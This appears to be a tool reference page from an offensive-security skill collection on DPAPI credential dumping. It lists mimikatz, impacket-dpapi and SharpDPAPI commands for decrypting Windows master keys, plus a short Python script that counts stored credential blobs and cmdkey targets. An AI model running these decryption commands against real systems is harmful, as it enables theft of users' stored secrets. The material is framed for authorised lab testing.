# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`credential-dumping-dpapi-and-secret-stores`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `mimikatz` | `dpapi::masterkey /in:<path> /sid:<sid> /password:<pw>` | Decrypt a master key with a user secret, lab only | Windows |
| `impacket-dpapi` | `impacket-dpapi masterkey -file <guid> -sid <sid> -password <pw>` | Offline master key decryption | Linux / Windows |
| `cmdkey` | `cmdkey /list` | Enumerate stored credential targets | Windows |
| `SharpDPAPI` | `SharpDPAPI.exe masterkeys /password:<pw>` | Structured DPAPI enumeration | Windows |
| `Get-Acl` | `Get-Acl "$env:APPDATA\Microsoft\Protect"` | Master key ACL | Windows |

## Minimal Lab Validation Script

Inventory the blobs and their ACLs, and name the decryption precondition; decryption is a separate authorised step.

```python
import os, subprocess

def ps(cmd):
    return subprocess.run(["powershell", "-NoProfile", "-Command", cmd],
                          capture_output=True, text=True).stdout.strip()

user_protect = os.path.expandvars(r"%APPDATA%\Microsoft\Protect")
print("user_master_keys", len([p for p in os.listdir(user_protect)] if os.path.isdir(user_protect) else []))
print("credential_files", ps("(Get-ChildItem \"$env:LOCALAPPDATA\\Microsoft\\Credentials\" "
                             "-Force -ErrorAction SilentlyContinue).Count"))
print("cmdkey_targets", len([ln for ln in ps("cmdkey /list").splitlines() if "Target:" in ln]))
```

## Flag Notes

- `/sid` is required because master key paths are keyed on the user's SID, not the account name.
- `/in` takes a single master key file, which keeps the operation scoped to one blob.
- `/list` in cmdkey shows targets only; it does not reveal the stored secret.
